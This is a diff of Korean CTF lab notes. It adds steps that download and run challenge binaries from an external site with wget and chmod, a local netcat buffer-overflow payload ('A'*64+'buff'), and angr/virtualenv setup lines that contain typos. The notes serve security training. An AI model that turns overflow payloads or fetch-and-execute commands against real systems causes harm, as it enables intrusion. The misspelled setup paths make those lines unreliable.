@@ -158,13 +158,58 @@ else {
        }
 ```
 
+#### main 터미널
+```
+home/ctf3 디렉토리에   
+vi key해서 아무거나 입력 후 저장
+```
+
+```
+wget http://javahacking.com/aihacking/random
+chmod 755 random
+./random
+```
+
 #### sub 터미널
 ```
 (python -c 'print"A"*64+"buff"';cat)|nc localhost 12350
 ```
 
-
+-------------
 ### numgame 
 ```
 mkdir ctf4
-cd cr
+cd ctf4
+wget http://javahacking.com/aihacking/numgame
+chmod 755 numgame
+./numgame
+```
+
+### sub
+```
+nc localhost 12343
+```
+
+-----
+### ANGR  
+#### 설치
+```
+sudo apt-get install python3-pip python3-dev
+pip3 install virtualenv virtualenvwrapper
+virtualenv  
+```
+
+```
+vi /root/.bashrc
+export WORKON_HOME=~/.environments
+source /usr/local/bin/virualenvwrapper.sh
+
+(/user/share/virtualenvwrapper/virtualwrapper.sh)
+```
+
+
+
+
+
+
+
